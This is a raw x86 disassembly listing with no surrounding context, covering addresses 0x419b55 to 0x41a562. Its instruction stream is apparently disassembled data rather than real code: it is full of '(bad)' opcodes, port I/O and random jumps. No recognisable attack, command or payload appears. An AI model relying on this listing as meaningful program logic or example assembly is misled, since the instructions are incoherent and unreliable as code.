  419b55:	sbb    DWORD PTR ds:0x71615a00,eax
  419b5b:	mov    eax,0x1fe6754
  419b60:	xor    eax,eax
  419b62:	add    DWORD PTR [eax],eax
  419b64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b65:	and    ch,BYTE PTR [eax+0x9]
  419b68:	retf   0x8ab6
  419b6b:	xchg   BYTE PTR [edi+0xefffda7],ah
  419b71:	es adc eax,0x405ba704
  419b77:	mov    DWORD PTR [ecx],eax
  419b79:	rol    BYTE PTR [ecx],0x0
  419b7c:	xchg   edi,eax
  419b7d:	adc    DWORD PTR es:[eax],0x6b
  419b81:	pop    ebx
  419b82:	add    BYTE PTR [ebx+0x1b6d9],cl
  419b88:	push   edi
  419b89:	and    DWORD PTR ds:0x2,ecx
	...
  419bb3:	add    BYTE PTR [eax],al
  419bb5:	add    BYTE PTR [ebp+0x7788bf60],ah
  419bbb:	pop    esp
  419bbc:	mov    ds,WORD PTR [ebx+ebx*2]
  419bbf:	pop    ebx
  419bc0:	add    BYTE PTR [ebp+0x6e],dh
  419bc3:	and    al,BYTE PTR [ebx+0x5b5b10]
  419bc9:	mov    DWORD PTR [ecx+0x270001b7],ebp
  419bcf:	fwait
  419bd0:	mov    BYTE PTR [esi-0x24fc2],ch
  419bd6:	and    DWORD PTR [esi+edi*2],edi
  419bd9:	cmovb  esi,DWORD PTR [ecx+eax*1-0x2434775]
  419be1:	dec    DWORD PTR [ecx]
  419be3:	cmp    esi,esp
  419be5:	add    esp,ebp
  419be7:	ss inc edx
  419be9:	xchg   DWORD PTR [esi-0x4d],ecx
  419bec:	jae    0x419c09
  419bee:	cmp    dh,BYTE PTR [ecx+eax*1+0x7e394775]
  419bf5:	(bad)  
  419bf8:	add    DWORD PTR [ecx-0x24340],ecx
  419bfe:	shl    esp,1
  419c00:	jp     0x419baf
  419c02:	sub    bh,BYTE PTR [eax+0x3eb70001]
  419c08:	hlt    
  419c09:	add    edi,DWORD PTR [esi]
  419c0b:	mov    ah,0x78
  419c0d:	test   DWORD PTR [esi-0x40],edx
  419c10:	add    DWORD PTR [eax],eax
  419c12:	mov    ah,0xbc
  419c14:	dec    eax
  419c16:	mov    al,ds:0xd67773
	...
  419c43:	add    BYTE PTR [ebp+0x47],bl
  419c46:	jl     0x419c4f
  419c48:	in     al,dx
  419c49:	sub    BYTE PTR [esi],dh
  419c4b:	out    0x67,eax
  419c4d:	mov    al,0x4
  419c4f:	(bad)  
  419c50:	mov    ch,0x7d
  419c52:	jg     0x419c33
  419c54:	inc    edx
  419c55:	fs ja  0x419c25
  419c58:	data16 clc 
  419c5a:	add    eax,0x343969fe
  419c5f:	sbb    BYTE PTR [edi-0x4e],0xb2
  419c63:	mov    cl,BYTE PTR [eax+0x51fb448c]
  419c69:	in     eax,0x80
  419c6b:	out    0x3f,al
  419c6d:	inc    ebp
  419c6e:	ja     0x419c3d
  419c70:	push   esi
  419c71:	xor    BYTE PTR ds:0x465b39fe,al
  419c77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c78:	xchg   edx,eax
  419c79:	cdq    
  419c7a:	out    dx,eax
  419c7b:	add    edi,DWORD PTR [ebp-0x4ffd696d]
  419c81:	inc    esi
  419c82:	jecxz  0x419c87
  419c84:	fcom   DWORD PTR ds:[eax]
  419c87:	sti    
  419c88:	mov    al,BYTE PTR [edx+esi*2+0x7d]
  419c8c:	cmp    DWORD PTR [edi-0x19],ebx
  419c8f:	add    esi,DWORD PTR [edi-0x6003024]
  419c95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c97:	jp     0x419c3c
  419c99:	inc    esi
  419c9a:	jecxz  0x419c9f
  419c9c:	ds aam 0x6d
  419c9f:	repz cmp eax,0xc378e75b
  419ca5:	inc    edx
  419ca6:	jmp    0x419cab
	...
  419cd0:	add    BYTE PTR [eax],al
  419cd2:	ds rcl edi,1
  419cd5:	add    esp,ebp
  419cd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cd8:	sub    DWORD PTR [ebx+0x31],edi
  419cdb:	pop    esp
  419cdc:	pop    ebp
  419cdd:	out    0x3d,eax
  419cdf:	pop    ebx
  419ce0:	out    0x8e,eax
  419ce2:	push   esi
  419ce3:	shl    BYTE PTR [ebp-0xd],cl
  419ce6:	cmp    eax,0xbb7ae75b
  419ceb:	inc    edx
  419cec:	jecxz  0x419cf1
  419cee:	sbb    esi,DWORD PTR ds:[eax+0x55]
  419cf2:	xor    eax,0xb703e75f
  419cf7:	(bad)  
  419cf9:	inc    DWORD PTR [ecx+0x517d62a5]
  419cff:	pop    edi
  419d00:	out    0x3,eax
  419d02:	les    ecx,FWORD PTR [edx-0x17]
  419d05:	aad    0x68
  419d07:	cwde   
  419d08:	pop    edi
  419d09:	adc    al,0x61
  419d0b:	xlat   BYTE PTR ds:[ebx]
  419d0c:	jmp    0x419d15
  419d0e:	ds pop ebx
  419d10:	cmp    al,0x1d
  419d12:	(bad)  
  419d13:	(bad)  
  419d15:	pop    es
  419d16:	ds pop ebx
  419d18:	add    BYTE PTR [eax-0x4c],ah
  419d1b:	inc    edx
  419d1c:	add    al,0xe9
  419d1e:	cmp    eax,0x5e57871b
  419d23:	pop    edi
  419d24:	add    cl,ch
  419d26:	mov    edx,0x3ded10dd
  419d2b:	pop    ebx
  419d2c:	mov    DWORD PTR [edi+0x3a],esp
  419d2f:	pop    edi
  419d30:	add    cl,ch
  419d32:	ret    
  419d33:	dec    ebx
  419d34:	add    bl,BYTE PTR [ebx+0x0]
	...
  419d5e:	add    BYTE PTR [eax],al
  419d60:	cmp    al,0x98
  419d62:	mov    cl,bl
  419d64:	cmp    dl,ch
  419d66:	sbb    al,0xe5
  419d68:	cmp    eax,0xc100735b
  419d6d:	fst    QWORD PTR [eax]
  419d6f:	in     eax,0x3d
  419d71:	pop    ebx
  419d72:	xchg   DWORD PTR [edi+0x42],ebp
  419d75:	pop    edi
  419d76:	add    cl,ch
  419d78:	jge    0x419d56
  419d7a:	scas   al,BYTE PTR es:[edi]
  419d7b:	in     eax,0x39
  419d7d:	pop    ebx
  419d7e:	add    BYTE PTR [eax-0x4c],dh
  419d81:	dec    ebx
  419d82:	add    al,0xe9
  419d84:	cmp    eax,0x41d186d2
  419d89:	pop    ebx
  419d8a:	add    BYTE PTR [ecx],bh
  419d8c:	pop    edx
  419d8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d8e:	mov    edi,ebp
  419d90:	inc    ecx
  419d91:	pop    ebx
  419d92:	add    BYTE PTR [edx+eax*2+0x41f986d2],bl
  419d99:	pop    ebx
  419d9a:	add    BYTE PTR [eax-0x3c],dh
  419d9d:	inc    ebx
  419d9e:	add    al,0xe9
  419da0:	cmp    eax,0x5e47871b
  419da5:	pop    edi
  419da6:	add    cl,ch
  419da8:	retf   0x10dd
  419dab:	in     eax,dx
  419dac:	cmp    eax,0x4567895b
  419db1:	pop    edi
  419db2:	add    cl,ch
  419db4:	lea    edi,[ebx-0x1]
  419db7:	pop    esi
  419db8:	cmp    DWORD PTR [edi+0x0],ebx
  419dbb:	add    BYTE PTR [edi+0x23],ah
  419dbe:	adc    eax,0x447e18b
	...
  419deb:	add    BYTE PTR [eax],al
  419ded:	add    BYTE PTR [edi-0x29],dl
  419df0:	xchg   BYTE PTR [eax],bl
  419df2:	and    ebx,DWORD PTR [eax+0x0]
  419df5:	inc    eax
  419df6:	scas   al,BYTE PTR es:[edi]
  419df7:	jmp    0x8685:0x5817041c
  419dfe:	daa    
  419dff:	pop    esp
  419e00:	add    BYTE PTR [eax],al
  419e02:	pushf  
  419e03:	rcr    BYTE PTR [eax],cl
  419e05:	add    al,0x27
  419e07:	pop    eax
  419e08:	shl    BYTE PTR [eax],1
  419e0a:	push   ss
  419e0b:	retf   0x41c
  419e0e:	pop    ss
  419e0f:	pop    eax
  419e10:	jno    0x419e2b
  419e12:	pop    esp
  419e13:	rcl    BYTE PTR [eax],cl
  419e15:	add    al,0xe7
  419e17:	push   edi
  419e18:	test   DWORD PTR [esi+0x533f],eax
  419e1e:	xchg   edi,eax
  419e1f:	(bad)  
  419e20:	scas   al,BYTE PTR es:[edi]
  419e21:	sbb    al,0xe3
  419e23:	push   edi
  419e24:	add    BYTE PTR [ecx+0x44861],cl
  419e2a:	xlat   BYTE PTR ds:[ebx]
  419e2b:	aam    0xb6
  419e2d:	sbb    bl,dl
  419e2f:	push   edi
  419e30:	add    al,dl
  419e32:	inc    ecx
  419e33:	cmp    DWORD PTR [ecx-0x3e],ebx
  419e36:	scas   eax,DWORD PTR es:[edi]
  419e37:	push   edi
  419e38:	xchg   DWORD PTR [ebx+eax*4+0x5b],eax
  419e3c:	push   esi
  419e3d:	push   edi
  419e3e:	sbb    al,0x24
  419e40:	and    al,0x10
  419e42:	sbb    al,0xaf
  419e44:	cmp    DWORD PTR [eax+0x730057a7],eax
  419e4a:	imul   ebx,esp,0xfffffffb
  419e4d:	add    al,0x4
  419e4f:	inc    ecx
  419e50:	aaa    
  419e51:	xchg   BYTE PTR [eax],al
	...
  419e7b:	add    BYTE PTR [ebx+0x1300005b],al
  419e81:	add    esi,ebx
  419e83:	fdivr  DWORD PTR [edi+ebx*4]
  419e86:	jg     0x419e68
  419e88:	ds mov ah,0x60
  419e8b:	cmp    DWORD PTR [esi-0x42],0xb246c25f
  419e92:	cmp    al,0x86
  419e94:	and    bh,BYTE PTR [esi-0x5135ffff]
  419e9a:	cmp    BYTE PTR ds:[esi],0xb4
  419e9e:	add    DWORD PTR [ecx+0x3b],esi
  419ea1:	xor    eax,0xa51502ef
  419ea6:	add    BYTE PTR ds:[ebx],bh
  419ea9:	mov    ah,0x1
  419eab:	jb     0x419eec
  419ead:	inc    ecx
  419eae:	cmp    eax,0x1b49300
  419eb3:	jb     0x419ef4
  419eb5:	jno    0x419e78
  419eb7:	call   0xc0c4e3f2
  419ebc:	cmp    eax,0xf426ec44
  419ec1:	cmp    edi,edi
  419ec3:	push   ebp
  419ec4:	mov    ch,0x72
  419ec6:	mov    ebx,eax
  419ec8:	(bad)  
  419ec9:	test   al,0xfb
  419ecb:	std    
  419ecc:	fcos   
  419ece:	inc    edi
  419ecf:	sbb    BYTE PTR [ebp+edi*8+0x60],al
  419ed3:	pop    esi
  419ed4:	cld    
  419ed5:	lods   al,BYTE PTR ds:[esi]
  419ed6:	add    DWORD PTR [ebp-0x2a],edx
  419ed9:	mov    eax,0xd1b9fdfb
  419ede:	test   al,al
	...
  419f08:	add    BYTE PTR [eax],al
  419f0a:	cmp    bl,BYTE PTR [edx-0x1ac1f73d]
  419f10:	mov    WORD PTR [edx+ebx*2-0x44],ds
  419f14:	push   esi
  419f15:	push   esi
  419f16:	lds    eax,FWORD PTR [ebx-0x7d]
  419f19:	mov    esi,0x1b066
  419f1e:	ds leave 
  419f20:	adc    BYTE PTR [ebp+eiz*1-0x40fffe4d],al
  419f27:	lods   eax,DWORD PTR ds:[esi]
  419f28:	add    DWORD PTR [eax],0x74e75b3e
  419f2e:	sub    esi,ebx
  419f30:	pop    ebx
  419f31:	sub    BYTE PTR [esi+0x57],al
  419f34:	pop    edx
  419f35:	ds pushw 0xffd2
  419f39:	add    BYTE PTR [eax-0x2a],dl
  419f3c:	mov    ch,0xeb
  419f3e:	push   cs
  419f3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f40:	mov    esi,0xbf91b400
  419f45:	std    
  419f46:	xor    al,0xa2
  419f48:	scas   al,BYTE PTR es:[edi]
  419f49:	lea    edi,[edx+0x77]
  419f4c:	dec    DWORD PTR [eax+edx*8+0x3e03e34a]
  419f53:	aad    0xa2
  419f55:	daa    
  419f56:	sbb    DWORD PTR [eax+eiz*4+0x5],ebx
  419f5a:	rol    DWORD PTR [ecx],1
  419f5c:	outs   dx,DWORD PTR ds:[esi]
  419f5d:	add    eax,0x7d7d90b
  419f62:	ds pop ebx
  419f64:	pusha  
  419f65:	mov    eax,ds:0x3e75722
  419f6a:	nop
  419f6b:	add    dl,al
  419f6d:	lds    eax,FWORD PTR [eax]
	...
  419f97:	add    BYTE PTR [esi],dh
  419f99:	pop    ebx
  419f9a:	push   0xffffffd0
  419f9c:	jecxz  0x419ff9
  419f9e:	xchg   ebp,eax
  419f9f:	pop    ds
  419fa0:	inc    edx
  419fa1:	pop    ebx
  419fa2:	out    0x8e,eax
  419fa4:	arpl   WORD PTR [esp+edi*4+0x1a],dx
  419fa8:	mov    bh,0xd8
  419faa:	xlat   BYTE PTR ds:[ebx]
  419fab:	pop    es
  419fac:	ds pop ebx
  419fae:	pusha  
  419faf:	mov    DWORD PTR [esi+0x57],edx
  419fb2:	out    0x3,eax
  419fb4:	(bad)  
  419fb5:	rcl    DWORD PTR [ebp+0x1f],cl
  419fb8:	inc    edx
  419fb9:	pop    ebx
  419fba:	out    0x8a,eax
  419fbc:	mov    eax,0x3e03eb4a
  419fc1:	(bad)  
  419fc2:	sbb    edi,DWORD PTR gs:[edx]
  419fc5:	pop    ebx
  419fc6:	out    0x8d,eax
  419fc8:	ss pop ebp
  419fca:	xor    BYTE PTR [ecx],al
  419fcc:	jle    0x419fa0
  419fce:	add    cl,ah
  419fd0:	cmp    al,0xe1
  419fd2:	sbb    al,0xe5
  419fd4:	cmp    eax,0xb500735b
  419fd9:	fcom   DWORD PTR [eax]
  419fdb:	in     eax,0x3d
  419fdd:	pop    ebx
  419fde:	xchg   DWORD PTR [edi+0x3a],ebp
  419fe1:	push   edi
  419fe2:	add    cl,ch
  419fe4:	std    
  419fe5:	fldcw  WORD PTR [esi+0x5b41e5]
  419feb:	jo     0x419fa5
  419fed:	dec    edx
  419fee:	add    al,0xe9
  419ff0:	cmp    eax,0x39d186d2
  419ff5:	pop    ebx
  419ff6:	add    BYTE PTR [ecx-0x572e2d9e],bh
	...
  41a024:	add    BYTE PTR [eax],al
  41a026:	adc    al,0x54
  41a028:	sub    DWORD PTR [ebx-0x6076f2c4],0x86fa9922
  41a032:	or     ebx,edx
  41a034:	xchg   cl,bl
  41a036:	cmp    DWORD PTR [ebx+0x0],ebx
  41a039:	popa   
  41a03a:	pop    edx
  41a03b:	jecxz  0x41a03c
  41a03d:	call   0x6f40fb7f
  41a042:	push   edx
  41a043:	push   edi
  41a044:	add    cl,ch
  41a046:	mov    dl,0xc1
  41a048:	and    al,0xed
  41a04a:	cmp    eax,0xba527f5b
  41a04f:	pop    ebx
  41a050:	add    cl,ch
  41a052:	dec    esp
  41a053:	inc    ebx
  41a054:	or     ebp,0x62024319
  41a05a:	push   cs
  41a05b:	ja     0x41a075
  41a05d:	cwde   
  41a05e:	les    edx,FWORD PTR [ecx-0x615b8118]
  41a064:	std    
  41a065:	mov    esi,0x2b590403
  41a06a:	dec    edx
  41a06b:	pop    ebx
  41a06c:	jg     0x41a080
  41a06e:	cmp    bl,BYTE PTR [eax+eax*1+0x0]
  41a072:	xchg   edi,eax
  41a073:	sub    al,BYTE PTR [ecx+ebp*1]
  41a076:	fstp   TBYTE PTR [eax+0x18]
  41a079:	sub    DWORD PTR [esp+ebx*2+0x79],0x42a6700
  41a081:	sub    DWORD PTR [ebx],ebx
  41a083:	jae    0x41a09d
  41a085:	mov    edx,DWORD PTR [ebx]
  41a087:	jae    0x41a0a1
  41a089:	push   ecx
	...
  41a0b2:	add    BYTE PTR [eax],al
  41a0b4:	fmul   QWORD PTR [ebp-0x5e929318]
  41a0ba:	sti    
  41a0bb:	pop    edi
  41a0bc:	and    DWORD PTR [edx],edi
  41a0be:	push   edi
  41a0bf:	ret    0x5c4f
  41a0c2:	ret    
  41a0c3:	xchg   BYTE PTR [edi],bh
  41a0c5:	push   ebx
  41a0c6:	add    BYTE PTR [eax],al
  41a0c8:	es pop esp
  41a0ca:	add    BYTE PTR [eax],al
  41a0cc:	xchg   esi,eax
  41a0cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0ce:	add    BYTE PTR [eax],0x17
  41a0d1:	pop    esp
  41a0d2:	outs   dx,DWORD PTR ds:[esi]
  41a0d3:	dec    ecx
  41a0d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0d5:	and    BYTE PTR [eax+ebx*1],ah
  41a0d8:	sbb    ebp,DWORD PTR ds:0x78a13b42
  41a0de:	add    al,0x0
  41a0e0:	pop    ss
  41a0e1:	sub    BYTE PTR [edx],bh
  41a0e3:	call   0x3d42c5
  41a0e8:	pop    esp
  41a0e9:	mov    gs,eax
  41a0eb:	add    ebx,DWORD PTR [ebp-0x5f]
  41a0ee:	sti    
  41a0ef:	mov    edx,DWORD PTR [ecx]
  41a0f1:	mov    ah,0xc9
  41a0f3:	stc    
  41a0f4:	jo     0x41a097
  41a0f6:	mov    al,BYTE PTR [ebx+edi*1+0x3f]
  41a0fa:	xchg   DWORD PTR [esi+0x57e7],ecx
  41a100:	dec    ebp
  41a101:	lea    esp,[ecx+eax*1]
  41a104:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a105:	mov    DWORD PTR [edx],eax
  41a107:	ret    0xd3c0
  41a10a:	std    
  41a10b:	(bad)  
  41a10c:	sbb    DWORD PTR [esp+eax*1+0x0],ecx
  41a110:	xchg   edi,eax
  41a111:	into   
  41a112:	sahf   
  41a113:	and    al,0x3e
  41a115:	scas   al,BYTE PTR es:[edi]
  41a116:	add    DWORD PTR [eax],eax
	...
  41a140:	add    BYTE PTR [eax],al
  41a142:	lock out dx,al
  41a144:	pop    edx
  41a145:	ret    0xb236
  41a148:	or     ch,0x81
  41a14b:	mov    dl,0xbb
  41a14d:	sbb    al,0x42
  41a14f:	mov    dl,0x1
  41a151:	mov    esp,ecx
  41a153:	mov    edx,0x2fb51778
  41a158:	adc    al,0x4
  41a15a:	ds mov dl,0x8a
  41a15d:	xchg   BYTE PTR [esi],dh
  41a15f:	scas   al,BYTE PTR es:[edi]
  41a160:	add    DWORD PTR [eax],eax
  41a162:	(bad)  
  41a163:	cmp    ch,BYTE PTR [esi+0x1b2421c]
  41a169:	xchg   DWORD PTR [eax+0x3e000581],edi
  41a16f:	cmp    DWORD PTR [esi+0x1b43a18],eax
  41a175:	mov    cl,BYTE PTR [esi-0x4e]
  41a178:	iret   
  41a179:	(bad)  
  41a17a:	cld    
  41a17b:	sub    al,0x14
  41a17d:	(bad)  
  41a17e:	fld    TBYTE PTR [eax+0x473e0005]
  41a184:	sbb    DWORD PTR [ecx+0x584c0],ecx
  41a18a:	sub    eax,DWORD PTR ds:[esi+0x1b44218]
  41a191:	inc    eax
  41a192:	(bad)  
  41a193:	pop    esi
  41a194:	and    BYTE PTR [esi+edi*1],al
  41a197:	mov    ah,0x8a
  41a199:	xchg   BYTE PTR [esi-0x48],cl
  41a19c:	add    DWORD PTR [eax],eax
  41a19e:	lds    ebp,FWORD PTR [esi]
  41a1a0:	sbb    al,0x4
  41a1a2:	ds mov ah,0xd1
  41a1a5:	and    BYTE PTR [eax],al
	...
  41a1cf:	add    BYTE PTR ds:0x3e042836,al
  41a1d5:	mov    ah,0x75
  41a1d7:	jb     0x41a19e
  41a1d9:	jno    0x41a19c
  41a1db:	call   0x205d326
  41a1e0:	push   cs
  41a1e1:	pop    ebx
  41a1e2:	setbe  BYTE PTR [ecx-0x3776e162]
  41a1e9:	dec    ebx
  41a1ea:	jmp    0x41a1ef
  41a1ec:	ds shl eax,cl
  41a1ef:	mov    ebx,0x3e79e89
  41a1f4:	sbb    eax,0x5b3e07d7
  41a1fa:	pusha  
  41a1fb:	sahf   
  41a1fc:	sbb    dl,BYTE PTR [edi-0x19]
  41a1ff:	add    ebp,ecx
  41a201:	mov    eax,ds:0x5b3e0367
  41a206:	pop    edx
  41a207:	sbb    al,0xbf
  41a209:	das    
  41a20a:	or     ebx,DWORD PTR [esp+edi*1]
  41a20d:	shl    BYTE PTR [ebx],cl
  41a20f:	sub    BYTE PTR [esi],ah
  41a211:	or     DWORD PTR [edx-0x33],esi
  41a214:	push   esi
  41a215:	aaa    
  41a216:	sar    ah,0x3b
  41a219:	(bad)  
  41a21a:	adc    al,0x5f
  41a21c:	xchg   edi,eax
  41a21d:	cdq    
  41a21e:	fild   WORD PTR [ebx]
  41a220:	test   eax,0x3e06e7a2
  41a225:	pop    ebx
  41a226:	sbb    DWORD PTR [eax],ecx
  41a228:	popa   
  41a229:	pop    ss
  41a22a:	retf   
  41a22b:	sbb    edx,DWORD PTR [ecx+0x3e7ee7a2]
  41a231:	pop    ebx
  41a232:	stc    
  41a233:	push   0x0
	...
  41a25d:	add    BYTE PTR [ecx+0x17],bl
  41a260:	ret    
  41a261:	sbb    eax,edi
  41a263:	push   es
  41a264:	retf   
  41a265:	sbb    ecx,DWORD PTR [edx+edx*8-0x5bce1463]
  41a26c:	data16 cld 
  41a26e:	cmp    ebp,0xffffffbb
  41a271:	pop    eax
  41a272:	cld    
  41a273:	push   edx
  41a274:	out    0x2,eax
  41a276:	nop
  41a277:	ds jecxz 0x41a27d
  41a27a:	ds sub al,ah
  41a27d:	mov    BYTE PTR [eax+0x3e03e34a],bh
  41a283:	aam    0x0
  41a285:	outs   dx,DWORD PTR ds:[esi]
  41a286:	push   ebp
  41a287:	push   edi
  41a288:	add    cl,ch
  41a28a:	std    
  41a28b:	aad    0xae
  41a28d:	add    eax,0x70005b36
  41a292:	ret    
  41a293:	dec    edx
  41a294:	add    al,0xe9
  41a296:	cmp    eax,0x41f186d4
  41a29b:	pop    ebx
  41a29c:	add    BYTE PTR [ecx],bl
  41a29e:	pop    ebp
  41a29f:	sahf   
  41a2a0:	mov    ebx,0x5b41dd
  41a2a5:	jl     0x41a2fb
  41a2a7:	aam    0x86
  41a2a9:	fld    DWORD PTR [ecx+0x5b]
  41a2ac:	add    BYTE PTR [eax-0x44],dh
  41a2af:	inc    edx
  41a2b0:	add    al,0xe9
  41a2b2:	cmp    eax,0x3687871b
  41a2b7:	push   edi
  41a2b8:	add    cl,ch
  41a2ba:	mov    edx,0x3ded10d4
  41a2bf:	pop    ebx
  41a2c0:	mov    DWORD PTR [edi+0x0],esp
	...
  41a2eb:	add    BYTE PTR [edx+0x57],bl
  41a2ee:	add    cl,ch
  41a2f0:	or     eax,0x5e15897c
  41a2f5:	inc    ebx
  41a2f6:	push   edx
  41a2f7:	jb     0x41a2ed
  41a2f9:	mov    bl,0xd4
  41a2fb:	mov    eax,ds:0x375d9f15
  41a300:	ja     0x41a304
  41a302:	ret    0x3de1
  41a305:	rol    BYTE PTR [ebp+ecx*8+0x1],cl
  41a309:	rcl    BYTE PTR [eax-0x2639a17],cl
  41a30f:	mov    dl,0xca
  41a311:	push   edi
  41a312:	add    al,0xe9
  41a314:	cmp    eax,0xb3721725
  41a319:	dec    edi
  41a31a:	add    al,0xe9
  41a31c:	cmp    eax,0x3edfbf62
  41a321:	jb     0x41a2e2
  41a323:	sub    edi,DWORD PTR [esi]
  41a325:	pop    ebx
  41a326:	sub    DWORD PTR [eax],eax
  41a328:	push   ss
  41a329:	pop    edx
  41a32a:	add    BYTE PTR [eax-0x5a],ch
  41a32d:	pop    eax
  41a32e:	ret    0xa704
  41a331:	gs rol dl,0xa3
  41a335:	pop    eax
  41a336:	jg     0x41a324
  41a338:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a339:	add    eax,0x3ccb8b51
  41a33e:	and    BYTE PTR [esi+0x74],dl
  41a341:	jge    0x41a2ca
  41a343:	icebp  
  41a344:	ror    bh,1
  41a346:	pop    esp
  41a347:	and    al,0x67
  41a349:	iret   
  41a34a:	pop    esp
  41a34b:	and    al,0x5f
  41a34d:	pop    edi
  41a34e:	scas   al,BYTE PTR es:[edi]
  41a34f:	or     BYTE PTR [eax],al
	...
  41a379:	add    BYTE PTR [ebx+0x58],ah
  41a37c:	add    BYTE PTR [edi],cl
  41a37e:	aam    0xf3
  41a380:	add    BYTE PTR [eax],al
  41a382:	push   edi
  41a383:	lods   eax,DWORD PTR ds:[esi]
  41a384:	pop    es
  41a385:	(bad)  
  41a386:	ret    
  41a387:	cmp    al,0x0
  41a389:	add    BYTE PTR [edi+0x58],ah
  41a38c:	mov    DWORD PTR [ebx+eax*2+0x57],esp
  41a390:	xchg   DWORD PTR [esi-0x263ad],eax
  41a396:	stos   BYTE PTR es:[edi],al
  41a397:	rol    BYTE PTR [eax],1
  41a399:	push   0xc8375826
  41a39e:	jno    0x41a3e8
  41a3a0:	xchg   DWORD PTR [esi-0x263d5],ecx
  41a3a6:	sbb    al,0x97
  41a3a8:	jbe    0x41a3ae
  41a3aa:	cld    
  41a3ab:	xchg   esi,eax
  41a3ac:	out    0xb,eax
  41a3ae:	cld    
  41a3af:	xchg   esi,eax
  41a3b0:	add    DWORD PTR [eax],eax
  41a3b2:	das    
  41a3b3:	push   esi
  41a3b4:	add    bl,ch
  41a3b6:	in     eax,0x64
  41a3b8:	ror    BYTE PTR [ebx+0x45059],0xd7
  41a3bf:	push   eax
  41a3c0:	mov    dh,0x11
  41a3c2:	call   0x4c42e9b0
  41a3c7:	or     al,0x96
  41a3c9:	add    al,0x3e
  41a3cb:	cmp    DWORD PTR ds:0x8b4bb58a,eax
  41a3d1:	or     al,0xb9
  41a3d3:	sub    BYTE PTR [edi+0x8],bh
  41a3d6:	inc    edx
  41a3d7:	mov    dl,0x1
  41a3d9:	or     eax,0xb60a81e8
	...
  41a406:	add    BYTE PTR [eax],al
  41a408:	(bad)  
  41a409:	mov    dl,0x8e
  41a40b:	dec    esp
  41a40c:	enter  0x8ead,0x96
  41a410:	inc    edx
  41a411:	mov    dh,0x1
  41a413:	add    bh,al
  41a415:	popf   
  41a416:	test   BYTE PTR [edi+0x1b23f],dh
  41a41c:	aas    
  41a41d:	and    al,0xfd
  41a41f:	add    edi,DWORD PTR [esi]
  41a421:	mov    dl,0x4
  41a423:	mov    es,WORD PTR [esi-0x52]
  41a426:	add    DWORD PTR [eax],eax
  41a428:	mov    ch,0x33
  41a42a:	std    
  41a42b:	add    edi,DWORD PTR [esi]
  41a42d:	mov    dl,0x8c
  41a42f:	enter  0x2c25,0x8
  41a433:	add    al,0x3e
  41a435:	mov    dl,0x82
  41a437:	idiv   DWORD PTR [esi]
  41a439:	sbb    al,BYTE PTR [ecx]
  41a43b:	add    al,cl
  41a43d:	lods   al,BYTE PTR ds:[esi]
  41a43e:	dec    ecx
  41a43f:	xchg   eax,eax
  41a441:	mov    ch,bh
  41a443:	push   DWORD PTR [ecx]
  41a445:	mov    WORD PTR [edi+0x1844208],fs
  41a44b:	or     eax,0xfdf76ebc
  41a450:	sbb    DWORD PTR [esi],ecx
  41a452:	inc    eax
  41a453:	and    al,0x4e
  41a455:	cs add al,0x65
  41a458:	aas    
  41a459:	test   BYTE PTR [edx+eax*8],bh
  41a45c:	mov    BYTE PTR [edx-0x2bddab76],cl
  41a462:	in     al,dx
  41a463:	pop    es
  41a464:	mov    ebp,0xc00d010c
  41a469:	mov    esi,0x1
	...
  41a496:	ds pop ebx
  41a498:	div    BYTE PTR [ecx-0x4e11a483]
  41a49e:	test   DWORD PTR [edx+eiz*2+0x40],ebx
  41a4a2:	rcr    BYTE PTR [edi+0x62],0x38
  41a4a6:	mov    dh,0x56
  41a4a8:	inc    edx
  41a4a9:	or     edx,eax
  41a4ab:	into   
  41a4ac:	call   0x6627e2b4
  41a4b1:	and    al,0x42
  41a4b3:	pop    ebx
  41a4b4:	out    0x86,eax
  41a4b6:	cmp    ch,BYTE PTR [edx+0x2e]
  41a4b9:	inc    eax
  41a4ba:	bound  esi,QWORD PTR [edi-0x19]
  41a4bd:	or     edi,DWORD PTR [esi]
  41a4bf:	pop    ebx
  41a4c0:	sar    BYTE PTR [esi-0x69daaf4],cl
  41a4c6:	inc    edi
  41a4c7:	xchg   esi,eax
  41a4c8:	jnp    0x41a4f9
  41a4ca:	(bad)
  41a4cd:	imul   esi,DWORD PTR [ecx-0x66],0xffffffb2
  41a4d1:	add    DWORD PTR [edx+0x5f],0x72e803e7
  41a4d8:	jb     0x41a45b
  41a4da:	dec    edx
  41a4db:	pop    edi
  41a4dc:	out    0x3,eax
  41a4de:	pop    ss
  41a4df:	xchg   ebx,eax
  41a4e0:	pop    ebp
  41a4e1:	add    BYTE PTR [edi],dl
  41a4e3:	xchg   ebx,eax
  41a4e4:	ret    0x1707
  41a4e7:	xchg   ebx,eax
  41a4e8:	push   0xe8033ec0
  41a4ed:	add    esp,DWORD PTR [edi]
  41a4ef:	pop    ebp
  41a4f0:	cli    
  41a4f1:	clc    
  41a4f2:	mov    bh,0x60
  41a4f4:	bound  esi,QWORD PTR [edi]
  41a4f6:	out    0xe7,al
  41a4f8:	jmp    0x41a502
	...
  41a522:	add    BYTE PTR [eax],al
  41a524:	push   edi
  41a525:	mov    al,ds:0x2f49cc1a
  41a52a:	retf   
  41a52b:	daa    
  41a52c:	nop
  41a52d:	pop    edi
  41a52e:	pusha  
  41a52f:	dec    edi
  41a530:	pop    edx
  41a531:	inc    edi
  41a532:	ret    0x4bfc
  41a535:	fistp  WORD PTR [ecx]
  41a537:	add    edi,DWORD PTR [esi]
  41a539:	pop    ebx
  41a53a:	add    BYTE PTR [edx+ecx*8+0x5a],ah
  41a53e:	add    cl,ch
  41a540:	cmp    eax,0xa12cbe4
  41a545:	loop   0x41a593
  41a547:	add    eax,0xd4c542e
  41a54c:	push   ss
  41a54d:	push   0x5b3d1385
  41a552:	add    BYTE PTR [edx+0x1],dh
  41a555:	aas    
  41a556:	adc    BYTE PTR [ebx+0x41],dh
  41a559:	call   0x9d89:0x5b409d37
  41a560:	inc    ecx
  41a561:	outs   dx,DWORD PTR ds:[esi]
  41a562:	mov    ecx,0x5b3deb
